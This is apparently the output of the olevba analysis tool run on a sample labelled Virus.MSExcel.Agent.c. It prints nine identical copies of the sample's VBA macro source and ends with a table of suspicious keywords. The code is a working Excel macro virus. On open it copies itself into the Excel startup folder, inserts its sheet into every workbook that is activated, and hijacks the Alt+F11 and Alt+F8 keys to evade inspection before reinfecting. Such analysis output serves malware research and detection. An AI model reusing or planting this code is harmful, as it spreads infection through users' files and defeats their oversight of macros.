olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_2.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_3.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_4.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_5.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_6.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_6'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_7.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_7'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_8.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_8'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO StartUp_9.bas 
in file: Virus.MSExcel.Agent.c-169b42e6abc1f14e1a1adbe696e8b709ceeae65d - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp_9'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
+----------+--------------------+---------------------------------------------+

